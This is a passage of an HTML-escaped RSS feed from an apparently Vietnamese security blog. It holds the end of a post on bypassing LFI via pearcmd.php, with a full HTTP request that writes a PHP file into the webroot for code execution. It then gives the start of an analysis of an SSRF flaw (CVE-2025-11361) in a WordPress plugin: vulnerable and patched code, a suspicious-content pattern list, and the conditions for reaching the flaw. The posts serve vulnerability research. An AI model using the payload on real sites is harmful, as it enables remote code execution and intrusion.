PHP trong file đó và đoạn mã sẽ được thực thi dẫn tới &lt;strong&gt;RCE&lt;/strong&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Tận dụng &lt;a href=&#34;https://w41bu1.github.io/2025-10-13-cve-2025-48293/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-48293&lt;/a&gt; đã phân tích để khai thác mở rộng bằng &lt;code&gt;pearcmd.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Gửi request chứa LFI payload trỏ đến &lt;code&gt;pearcmd.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-ajax.php?action=geo_mashup_query&amp;amp;object_ids=2&amp;amp;template=../../../../../../../usr/local/lib/php/pearcmd&amp;amp;&amp;#43;config-create&amp;#43;/&amp;lt;?=phpinfo();?&amp;gt;&amp;#43;/var/www/html/shell.php HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: en-US,en;q=0.5&#xA;Accept-Encoding: gzip, deflate, br&#xA;Referer: http://localhost/wp-admin/&#xA;Connection: keep-alive&#xA;Upgrade-Insecure-Requests: 1&#xA;Sec-Fetch-Dest: document&#xA;Sec-Fetch-Mode: navigate&#xA;Sec-Fetch-Site: same-origin&#xA;Sec-Fetch-User: ?1&#xA;X-PwnFox-Color: blue&#xA;Priority: u=0, i&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Response trả về thành công&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/res2.png&#34; title=&#34;Response trả về thành công&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/res2.png&#34; data-sub-html=&#34;&lt;h2&gt;res2&lt;/h2&gt;&lt;p&gt;Response trả về thành công&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/res2.png&#39; alt=&#34;res2&#34; height=&#34;937&#34; width=&#34;1536&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Response trả về thành công&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Truy cập &lt;code&gt;shell.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/shell.png&#34; title=&#34;shell.php&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/shell.png&#34; data-sub-html=&#34;&lt;h2&gt;shell&lt;/h2&gt;&lt;p&gt;shell.php&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/shell.png&#39; alt=&#34;shell&#34; height=&#34;1078&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;shell.php&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-11361 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-22-cve-2025-11361/</link>
      <pubDate>Wed, 22 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-22-cve-2025-11361/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-22-cve-2025-11361/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Gutenberg Essential Blocks – Page Builder for Gutenberg Blocks &amp;amp; Patterns&lt;/strong&gt; cho &lt;strong&gt;WordPress&lt;/strong&gt; bị lỗ hổng &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt; trong tất cả các phiên bản lên tới và bao gồm &lt;strong&gt;5.7.1&lt;/strong&gt;, thông qua hàm &lt;strong&gt;eb_save_ai_generated_image&lt;/strong&gt;.&lt;br&gt;&#xA;Điều này cho phép kẻ tấn công đã xác thực, có quyền &lt;strong&gt;Author-level&lt;/strong&gt; trở lên, thực hiện các yêu cầu web tới bất kỳ địa chỉ nào xuất phát từ ứng dụng web và có thể bị lợi dụng để truy vấn và chỉnh sửa thông tin từ các dịch vụ nội bộ.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11361&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11361&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.7.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.7.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Author&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/essential-blocks/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Essential Blocks for Gutenberg Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Essential Blocks for Gutenberg&lt;/strong&gt;: &lt;strong&gt;5.7.1&lt;/strong&gt; (vulnerable) và &lt;strong&gt;5.7.2&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Bản lỗi&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function eb_save_ai_generated_image()&#xA;{&#xA;    if ( ! isset( $_POST[ &amp;#39;admin_nonce&amp;#39; ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ &amp;#39;admin_nonce&amp;#39; ] ), &amp;#39;admin-nonce&amp;#39; ) ) {&#xA;        wp_send_json_error( __( &amp;#39;Nonce Error&amp;#39;, &amp;#39;essential-blocks&amp;#39; ) );&#xA;    }&#xA;    if ( ! current_user_can( &amp;#39;upload_files&amp;#39; ) ) {&#xA;        wp_send_json_error( __( &amp;#39;You are not authorized to upload files!&amp;#39;, &amp;#39;essential-blocks&amp;#39; ) );&#xA;    }&#xA;    // Check if we have either image_url or image_b64 along with prompt&#xA;    if ( ( isset( $_POST[ &amp;#39;image_url&amp;#39; ] ) || isset( $_POST[ &amp;#39;image_b64&amp;#39; ] ) ) &amp;amp;&amp;amp; isset( $_POST[ &amp;#39;prompt&amp;#39; ] ) ) {&#xA;        $image_url   = isset( $_POST[ &amp;#39;image_url&amp;#39; ] ) ? esc_url_raw( $_POST[ &amp;#39;image_url&amp;#39; ] ) : null;&#xA;        $image_body = &amp;#39;&amp;#39;;&#xA;        // Handle URL format&#xA;        if ( $image_url ) {&#xA;            // Download the image from OpenAI URL&#xA;            $image_data = wp_remote_get( $image_url, [&#xA;                &amp;#39;timeout&amp;#39; =&amp;gt; 60&#xA;                ] );&#xA;            if ( is_wp_error( $image_data ) ) {&#xA;                wp_send_json_error( [&#xA;                    &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Failed to download image from OpenAI.&amp;#39;, &amp;#39;essential-blocks&amp;#39; )&#xA;                    ] );&#xA;                return;&#xA;            }&#xA;            // Detect image format and set appropriate extension and MIME type&#xA;            $image_info = getimagesizefromstring( $image_body );&#xA;            $mime_type  = $image_info ? $image_info[ &amp;#39;mime&amp;#39; ] : &amp;#39;image/png&amp;#39;;&#xA;&#xA;            // Determine file extension based on MIME type&#xA;            $extension = &amp;#39;png&amp;#39;; // default&#xA;            switch ( $mime_type ) {&#xA;                case &amp;#39;image/jpeg&amp;#39;:&#xA;                    $extension = &amp;#39;jpg&amp;#39;;&#xA;                    break;&#xA;                case &amp;#39;image/png&amp;#39;:&#xA;                    $extension = &amp;#39;png&amp;#39;;&#xA;                    break;&#xA;                case &amp;#39;image/webp&amp;#39;:&#xA;                    $extension = &amp;#39;webp&amp;#39;;&#xA;                    break;&#xA;                case &amp;#39;image/gif&amp;#39;:&#xA;                    $extension = &amp;#39;gif&amp;#39;;&#xA;                    break;&#xA;            }&#xA;            $image_body = wp_remote_retrieve_body( $image_data );&#xA;        }&#xA;        // other logic&#xA;    } else {&#xA;        wp_send_json_error( __( &amp;#39;Image data (URL or base64) and prompt are required&amp;#39;, &amp;#39;essential-blocks&amp;#39; ) );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phiên bản lỗi, sử dụng &lt;code&gt;wp_remote_get($image_url)&lt;/code&gt; để tải hình ảnh mà không xác thực hoặc giới hạn nguồn URL. Không kiểm tra mã phản hồi HTTP, MIME type hay nội dung thực tế của tệp trả về, khiến kẻ tấn công có thể lợi dụng gửi yêu cầu SSRF đến các dịch vụ nội bộ hoặc tải về dữ liệu độc hại giả dạng hình ảnh.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function eb_save_ai_generated_image()&#xA;{&#xA;    if ( ! isset( $_POST[ &amp;#39;admin_nonce&amp;#39; ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ &amp;#39;admin_nonce&amp;#39; ] ), &amp;#39;admin-nonce&amp;#39; ) ) {&#xA;        wp_send_json_error( __( &amp;#39;Nonce Error&amp;#39;, &amp;#39;essential-blocks&amp;#39; ) );&#xA;    }&#xA;    if ( ! current_user_can( &amp;#39;upload_files&amp;#39; ) ) {&#xA;        wp_send_json_error( __( &amp;#39;You are not authorized to upload files!&amp;#39;, &amp;#39;essential-blocks&amp;#39; ) );&#xA;    }&#xA;    // Check if we have either image_url or image_b64 along with prompt&#xA;    if ( ( isset( $_POST[ &amp;#39;image_url&amp;#39; ] ) || isset( $_POST[ &amp;#39;image_b64&amp;#39; ] ) ) &amp;amp;&amp;amp; isset( $_POST[ &amp;#39;prompt&amp;#39; ] ) ) {&#xA;        $image_url   = isset( $_POST[ &amp;#39;image_url&amp;#39; ] ) ? esc_url_raw( $_POST[ &amp;#39;image_url&amp;#39; ] ) : null;&#xA;        $image_body = &amp;#39;&amp;#39;;&#xA;        // Handle URL format&#xA;        if ( $image_url ) {&#xA;            // Download the image from validated URL&#xA;            $image_data = wp_safe_remote_get( $image_url, [&#xA;                &amp;#39;timeout&amp;#39;     =&amp;gt; 30,&#xA;                &amp;#39;redirection&amp;#39; =&amp;gt; 3,&#xA;                &amp;#39;user-agent&amp;#39;  =&amp;gt; &amp;#39;Essential Blocks/&amp;#39; . ESSENTIAL_BLOCKS_VERSION,&#xA;                &amp;#39;headers&amp;#39;     =&amp;gt; [&#xA;                    &amp;#39;Accept&amp;#39; =&amp;gt; &amp;#39;image/*&amp;#39;&#xA;                    ]&#xA;                ] );&#xA;            if ( is_wp_error( $image_data ) ) {&#xA;                wp_send_json_error( [&#xA;                    &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Failed to download image from URL.&amp;#39;, &amp;#39;essential-blocks&amp;#39; )&#xA;                    ] );&#xA;                return;&#xA;            }&#xA;            // Validate response&#xA;            $response_code = wp_remote_retrieve_response_code( $image_data );&#xA;            if ( $response_code !== 200 ) {&#xA;                wp_send_json_error( [&#xA;                    &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Invalid response from image URL.&amp;#39;, &amp;#39;essential-blocks&amp;#39; )&#xA;                    ] );&#xA;                return;&#xA;            }&#xA;            // Security: Validate image content and size&#xA;            if ( ! $this-&amp;gt;is_valid_image_content( $image_body ) ) {&#xA;                wp_send_json_error( [&#xA;                    &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Invalid image content provided.&amp;#39;, &amp;#39;essential-blocks&amp;#39; )&#xA;                 ] );&#xA;                return;&#xA;            }&#xA;            // Detect image format and set appropriate extension and MIME type&#xA;            $image_info = getimagesizefromstring( $image_body );&#xA;            if ( ! $image_info ) {&#xA;                wp_send_json_error( [&#xA;                    &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Unable to determine image format.&amp;#39;, &amp;#39;essential-blocks&amp;#39; )&#xA;                 ] );&#xA;                return;&#xA;            }&#xA;&#xA;            $mime_type = $image_info[ &amp;#39;mime&amp;#39; ];&#xA;&#xA;            // Security: Only allow specific image MIME types&#xA;            $allowed_mime_types = [&#xA;                &amp;#39;image/jpeg&amp;#39;,&#xA;                &amp;#39;image/png&amp;#39;,&#xA;                &amp;#39;image/webp&amp;#39;,&#xA;                &amp;#39;image/gif&amp;#39;&#xA;             ];&#xA;&#xA;            if ( ! in_array( $mime_type, $allowed_mime_types, true ) ) {&#xA;                wp_send_json_error( [&#xA;                    &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Unsupported image format.&amp;#39;, &amp;#39;essential-blocks&amp;#39; )&#xA;                 ] );&#xA;                return;&#xA;            }&#xA;            $image_body = wp_remote_retrieve_body( $image_data );&#xA;        }&#xA;        // other logic&#xA;    } else {&#xA;        wp_send_json_error( __( &amp;#39;Image data (URL or base64) and prompt are required&amp;#39;, &amp;#39;essential-blocks&amp;#39; ) );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá thay &lt;code&gt;wp_remote_get()&lt;/code&gt; bằng &lt;code&gt;wp_safe_remote_get()&lt;/code&gt; để chặn truy cập đến địa chỉ nội bộ, thêm kiểm tra mã phản hồi HTTP, xác thực nội dung và định dạng hình ảnh (&lt;code&gt;is_valid_image_content()&lt;/code&gt;, giới hạn MIME hợp lệ), đồng thời giảm timeout và redirect nhằm tăng cường an toàn — qua đó ngăn chặn hoàn toàn khả năng SSRF và xử lý dữ liệu phản hồi một cách an toàn.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private function is_valid_image_content( $image_data )&#xA;{&#xA;    if ( empty( $image_data ) ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    // Check file size (max 10MB)&#xA;    $max_size = 10 * 1024 * 1024; // 10MB&#xA;    if ( strlen( $image_data ) &amp;gt; $max_size ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    // Validate image using getimagesizefromstring&#xA;    $image_info = getimagesizefromstring( $image_data );&#xA;    if ( ! $image_info ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    // Check image dimensions (reasonable limits)&#xA;    $max_width  = 4096;&#xA;    $max_height = 4096;&#xA;    if ( $image_info[ 0 ] &amp;gt; $max_width || $image_info[ 1 ] &amp;gt; $max_height ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    // Additional security: Check for suspicious content patterns&#xA;    // Look for common file signatures that shouldn&amp;#39;t be in images&#xA;    $suspicious_patterns = [&#xA;        &amp;#39;&amp;lt;?php&amp;#39;, // PHP code&#xA;        &amp;#39;&amp;lt;script&amp;#39;, // JavaScript&#xA;        &amp;#39;javascript:&amp;#39;, // JavaScript protocol&#xA;        &amp;#39;data:text/&amp;#39;, // Text data URLs&#xA;        &amp;#39;&amp;lt;html&amp;#39;, // HTML content&#xA;        &amp;#39;#!/bin/&amp;#39; // Shell scripts&#xA;        ];&#xA;&#xA;    $data_start = substr( $image_data, 0, 1024 ); // Check first 1KB&#xA;    foreach ( $suspicious_patterns as $pattern ) {&#xA;        if ( stripos( $data_start, $pattern ) !== false ) {&#xA;            return false;&#xA;        }&#xA;    }&#xA;&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;eb_save_ai_generated_image()&lt;/code&gt; được đăng ký làm callback cho action hook, với hook name &lt;code&gt;wp_ajax_save_ai_generated_image&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_save_ai_generated_image&amp;#39;, [ $this, &amp;#39;eb_save_ai_generated_image&amp;#39; ] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tức khi truy cập endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với param &lt;code&gt;action=save_ai_generated_image&lt;/code&gt; thì &lt;code&gt;eb_save_ai_generated_image()&lt;/code&gt; được gọi.&lt;/p&gt;&#xA;&lt;p&gt;Để &lt;code&gt;wp_remote_get()&lt;/code&gt; được thực thi, ta cần vượt qua các điều kiện sau:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;check &lt;code&gt;admin_nonce&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! isset( $_POST[ &amp;#39;admin_nonce&amp;#39; ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ &amp;#39;admin_nonce&amp;#39; ] ), &amp;#39;admin-nonce&amp;#39; ) ) {&#xA;    wp_send_json_error( __( &amp;#39;Nonce Error&amp;#39;, &amp;#39;essential-blocks&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Mặc định khi truy cập &lt;code&gt;wp-admin&lt;/code&gt;, &lt;code&gt;admin_nonce&lt;/code&gt; sẽ được set, có thể tìm thấy bằng cách inspect code và tìm với từ khóa &lt;code&gt;admin_nonce&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-22-cve-2025-11361/admin_nonce.png&#34;&#xA;    alt=&#34;Tìm admin_nonce bằng cách inspect code&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Tìm &lt;code&gt;admin_nonce&lt;/code&gt; bằng cách inspect code&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Check user-level&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( &amp;#39;upload_files&amp;#39; ) ) {&#xA;    wp_send_json_error( __( &amp;#39;You are not authorized to upload files!&amp;#39;, &amp;#39;essential-blocks&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;upload_files&lt;/code&gt; yêu cầu user Author-level trở lên&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;POST request&lt;/code&gt; chứa &lt;code&gt;image_url&lt;/code&gt; và &lt;code&gt;prompt&lt;/code&gt; param.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ( isset( $_POST[ &amp;#39;image_url&amp;#39; ] ) || isset( $_POST[ &amp;#39;image_b64&amp;#39; ] ) ) &amp;amp;&amp;amp; isset( $_POST[ &amp;#39;prompt&amp;#39; ] ) )&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 